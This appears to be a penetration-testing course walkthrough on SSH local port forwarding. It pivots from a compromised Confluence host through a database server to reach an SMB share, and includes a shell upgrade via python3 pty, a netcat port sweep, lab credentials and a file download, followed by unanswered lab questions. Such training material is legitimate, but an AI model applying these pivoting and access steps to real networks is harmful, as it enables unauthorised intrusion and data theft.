# SSH Local Port Forwarding

How we want our SSH local port forward to work in the lab, at a high level
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Local-Port-Forwarding-1.png)

Giving our reverse shell TTY functionality with Python3's pty, and logging into PGDATABASE01 as database_admin
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
>
># ========== Expected Result ==========
></bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
># =====================================
>
>$ ssh database_admin@10.4.50.215
>
># ========== Expected Result ==========
><sian/confluence/bin$ ssh database_admin@10.4.50.215   
>Could not create directory '/home/confluence/.ssh'.
>The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
>ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>yes
>Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
>database_admin@10.4.50.215's password: 
>
>Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
>
> * Documentation:  https://help.ubuntu.com
> * Management:     https://landscape.canonical.com
> * Support:        https://ubuntu.com/advantage
>
>  System information as of Thu 18 Aug 2022 03:01:09 PM UTC
>
>  System load:  0.0               Processes:               241
>  Usage of /:   59.4% of 7.77GB   Users logged in:         2
>  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
>  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215
>
>
>0 updates can be applied immediately.
>
>Last login: Thu Aug 18 11:43:08 2022 from 10.4.50.63
>database_admin@pgdatabase01:~$
># =====================================
>```

Enumerating network interfaces on PGDATABASE01
>``` shell
>database_admin@pgdatabase01:~$ ip addr
>
># ========== Expected Result ==========
>1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
>    inet 127.0.0.1/8 scope host lo
>       valid_lft forever preferred_lft forever
>    inet6 ::1/128 scope host 
>       valid_lft forever preferred_lft forever
>2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
>    link/ether 00:50:56:8a:6b:9b brd ff:ff:ff:ff:ff:ff
>    inet 10.4.50.215/24 brd 10.4.50.255 scope global ens192
>       valid_lft forever preferred_lft forever
>    inet6 fe80::250:56ff:fe8a:6b9b/64 scope link 
>       valid_lft forever preferred_lft forever
>3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
>    link/ether 00:50:56:8a:0d:b6 brd ff:ff:ff:ff:ff:ff
>    inet 172.16.50.215/24 brd 172.16.50.255 scope global ens224
>       valid_lft forever preferred_lft forever
>    inet6 fe80::250:56ff:fe8a:db6/64 scope link 
>       valid_lft forever preferred_lft forever
>4: ens256: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
>    link/ether 00:50:56:8a:f0:8e brd ff:ff:ff:ff:ff:ff
># =====================================
>```

Enumerating network routes on PGDATABASE01
>``` shell
>database_admin@pgdatabase01:~$ ip route
>
># ========== Expected Result ==========
>10.4.50.0/24 dev ens192 proto kernel scope link src 10.4.50.215 
>10.4.50.0/24 via 10.4.50.254 dev ens192 proto static
>172.16.50.0/24 dev ens224 proto kernel scope link src 172.16.50.215 
>172.16.50.0/24 via 172.16.50.254 dev ens224 proto static
># =====================================
>```

Using a bash loop with Netcat to sweep for port 445 in the newly found subnet
>``` shell
>database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
>
># ========== Expected Result ==========
>< (seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
>nc: connect to 172.16.50.1 port 445 (tcp) timed out: Operation now in progress
>...
>nc: connect to 172.16.50.216 port 445 (tcp) failed: Connection refused
>Connection to 172.16.50.217 445 port [tcp/microsoft-ds] succeeded!
>nc: connect to 172.16.50.218 port 445 (tcp) timed out: Operation now in progress
>...
>database_admin@pgdatabase01:~$ 
># =====================================
>```

Explaining OpenSSH's -L option
>``` shell
>[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
>```

Running the local port forward command
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
>
># ========== Expected Result ==========
><0:4455:172.16.50.217:445 database_admin@10.4.50.215   
>Could not create directory '/home/confluence/.ssh'.
>The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
>ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>yes
>Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
>database_admin@10.4.50.215's password: 
># =====================================
>```

Port 4455 listening on all interfaces on CONFLUENCE01
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu 
>
># ========== Expected Result ==========
>ss -ntplu
>Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
>udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*
>tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=59288,fd=4))
>tcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*
>tcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*
>tcp    LISTEN  0       128                     [::]:22               [::]:*
>tcp    LISTEN  0       10                         *:8090                *:*      users:(("java",pid=1020,fd=44))
>tcp    LISTEN  0       1024                       *:8091                *:*      users:(("java",pid=1311,fd=15))
>tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*      users:(("java",pid=1020,fd=76))
># =====================================
>```

The SSH local port forward set up, with the command running on CONFLUENCE01
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Local-Port-Forwarding-2.png)

Listing SMB shares through the SSH local port forward running on CONFLUENCE01
>``` shell
>kali@kali:~$ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
>
># ========== Expected Result ==========
>        Sharename       Type      Comment
>        ---------       ----      -------
>        ADMIN$          Disk      Remote Admin
>        C$              Disk      Default share
>        IPC$            IPC       Remote IPC
>        scripts         Disk
>        Users           Disk      
>Reconnecting with SMB1 for workgroup listing.
>do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
>Unable to connect with SMB1 -- no workgroup available
># =====================================
>```

Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01
>``` shell
>kali@kali:~$ smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
>
># ========== Expected Result ==========
>Try "help" to get a list of possible commands.
>smb: \>
># =====================================
>
>smb: \> ls
>
># ========== Expected Result ==========
>  .                                   D        0  Thu Aug 18 22:21:24 2022
>  ..                                 DR        0  Thu Aug 18 19:42:49 2022
>  Provisioning.ps1                    A      387  Thu Aug 18 22:21:52 2022
>  README.txt                          A      145  Thu Aug 18 22:22:40 2022
>
>                5319935 blocks of size 4096. 152141 blocks available
># =====================================
>
>smb: \> get Provisioning.ps1
>
># ========== Expected Result ==========
>getting file \Provisioning.ps1 of size 387 as Provisioning.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
># =====================================
>```

Lab 1 - Start VM Group 1 and follow the steps in this exercise. What's the flag in Provisioning.ps1?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2. A server is running on HRSHARES port 4242. Download the ssh_local_client binary from the Resources section. If you're using the aarch64 build of Kali, download the ssh_local_client_aarch64 binary. Create an SSH local port forward on CONFLUENCE01, which will let you run the binary from your Kali machine against the server on HRSHARES and retrieve the flag.
>``` shell
>
>```
>
